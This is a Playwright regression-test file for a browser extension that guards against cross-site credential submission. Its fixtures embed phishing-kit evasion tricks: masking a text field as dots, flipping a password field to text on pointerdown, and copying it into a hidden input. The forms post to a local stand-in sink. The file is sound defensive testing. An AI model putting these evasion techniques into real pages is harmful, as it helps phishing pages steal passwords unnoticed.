import { chromium, expect, test } from "@playwright/test";
import type { BrowserContext, Page } from "@playwright/test";
import fs from "node:fs";
import path from "node:path";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import {
  clickModalButton,
  getServiceWorker,
  readCredentialModal,
  waitForCredentialModal,
  waitForNavSentinelBridge,
} from "./extension_test_utils";

// #1220: a phishing kit must not dodge the cross-site credential prompt by
// rendering a text input as dots, or by flipping a password field to text
// right before submit.

const FORM_TAIL = `<button id="go">Sign in</button></form>`;
const FORM_HEAD = `<form id="login" method="post" action="http://destination.test/sink">`;

async function withVictimPage(
  body: string,
  run: (page: Page, posts: () => number) => Promise<void>,
): Promise<void> {
  const extensionPath = path.resolve("extension/dist");
  expect(fs.existsSync(path.join(extensionPath, "manifest.json")), "build required").toBe(true);
  fs.mkdirSync("test-results", { recursive: true });
  const profile = fs.mkdtempSync(path.resolve("test-results/masked-password-field-"));
  const context: BrowserContext = await chromium.launchPersistentContext(profile, {
    headless: false,
    args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
  });
  try {
    const worker = await getServiceWorker(context);
    await worker.evaluate(async (key) => {
      await chrome.storage.local.set({
        [key]: {
          nav: { defaultMode: "smart", debug: false },
          credential: {
            mode: "smart", promptOnUntrustedDomain: true, promptOnMediumRisk: false,
            mediumRiskThreshold: 100, blockHttpPasswordSubmit: false, warnOnPaste: true,
            similarity: { enabled: true, maxDistance: 2 },
          },
          logLimit: 300,
        },
      });
    }, SUITE_SETTINGS_KEY);
    let posts = 0;
    await context.route("**/*", async (route) => {
      const url = new URL(route.request().url());
      if (url.protocol === "chrome-extension:") {
        await route.continue();
      } else if (url.hostname === "destination.test") {
        if (route.request().method() === "POST") posts++;
        await route.fulfill({ contentType: "text/html", body: "<p>local fixture sink</p>" });
      } else if (url.hostname === "victim.test") {
        await route.fulfill({ contentType: "text/html", body: `<!doctype html>${body}` });
      } else {
        await route.abort();
      }
    });
    const page = await context.newPage();
    await page.goto("http://victim.test/login");
    await waitForNavSentinelBridge(page);
    await page.waitForTimeout(300);
    await run(page, () => posts);
  } finally {
    await context.close();
    fs.rmSync(profile, { recursive: true, force: true });
  }
}

test("a text input masked with -webkit-text-security still raises the credential prompt @regression", async () => {
  await withVictimPage(
    `<style>.dots { -webkit-text-security: disc; }</style>
     ${FORM_HEAD}<input name="user" type="text"><input name="pw" type="text" class="dots" value="dummy-canary">${FORM_TAIL}`,
    async (page, posts) => {
      await page.click("#go", { noWaitAfter: true });
      await waitForCredentialModal(page);
      await page.waitForTimeout(500);
      expect(posts(), "no masked-field POST before a decision").toBe(0);
      await clickModalButton(page, "Cancel");
      await page.waitForTimeout(500);
      expect(posts(), "no masked-field POST after cancellation").toBe(0);
    },
  );
});

test("a password field flipped to text on pointerdown of the submit button still raises the prompt @regression", async () => {
  await withVictimPage(
    `${FORM_HEAD}<input name="pw" id="pw" type="password">${FORM_TAIL}
     <script>document.getElementById("go").addEventListener("pointerdown", () => {
       document.getElementById("pw").type = "text";
     });</script>`,
    async (page, posts) => {
      await page.fill("#pw", "dummy-canary");
      await page.click("#go", { noWaitAfter: true });
      expect(await page.evaluate(() => (document.getElementById("pw") as HTMLInputElement).type)).toBe("text");
      await waitForCredentialModal(page);
      await page.waitForTimeout(500);
      expect(posts(), "no flipped-field POST before a decision").toBe(0);
      await clickModalButton(page, "Cancel");
      await page.waitForTimeout(500);
      expect(posts(), "no flipped-field POST after cancellation").toBe(0);
    },
  );
});

test("disabling the password field and copying it to a hidden input on pointerdown still raises the prompt @regression", async () => {
  await withVictimPage(
    `${FORM_HEAD}<input name="pw" id="pw" type="password">${FORM_TAIL}
     <script>document.getElementById("go").addEventListener("pointerdown", () => {
       const pw = document.getElementById("pw");
       const copy = document.createElement("input");
       copy.type = "hidden"; copy.name = pw.name; copy.value = pw.value;
       pw.disabled = true;
       pw.form.appendChild(copy);
     });</script>`,
    async (page, posts) => {
      await page.fill("#pw", "dummy-canary");
      await page.click("#go", { noWaitAfter: true });
      expect(await page.evaluate(() => (document.getElementById("pw") as HTMLInputElement).disabled)).toBe(true);
      await waitForCredentialModal(page);
      await page.waitForTimeout(500);
      expect(posts(), "no hidden-copy POST before a decision").toBe(0);
      await clickModalButton(page, "Cancel");
      await page.waitForTimeout(500);
      expect(posts(), "no hidden-copy POST after cancellation").toBe(0);
    },
  );
});

test("a password field flipped to text by script before it is ever focused still raises the prompt @regression", async () => {
  await withVictimPage(
    `${FORM_HEAD}<input name="pw" id="pw" type="password">${FORM_TAIL}`,
    async (page, posts) => {
      // Flipped once the guard is running (the bridge is up) and before any focus or input.
      // A flip inside the parser, before the guard module has loaded, is not observable.
      await page.evaluate(() => { (document.getElementById("pw") as HTMLInputElement).type = "text"; });
      expect(await page.evaluate(() => (document.getElementById("pw") as HTMLInputElement).type)).toBe("text");
      await page.fill("#pw", "dummy-canary");
      await page.click("#go", { noWaitAfter: true });
      await waitForCredentialModal(page);
      await page.waitForTimeout(500);
      expect(posts(), "no pre-focus-flip POST before a decision").toBe(0);
      await clickModalButton(page, "Cancel");
      await page.waitForTimeout(500);
      expect(posts(), "no pre-focus-flip POST after cancellation").toBe(0);
    },
  );
});

test("a plain cross-site search form with no masked field stays quiet @regression", async () => {
  await withVictimPage(
    `${FORM_HEAD}<input name="q" type="search" value="weather"><input name="n" type="text" value="plain">${FORM_TAIL}`,
    async (page, posts) => {
      await page.click("#go", { noWaitAfter: true });
      await expect.poll(posts, { timeout: 4000 }).toBe(1);
      expect(await readCredentialModal(page), "no credential prompt").toBeNull();
    },
  );
});
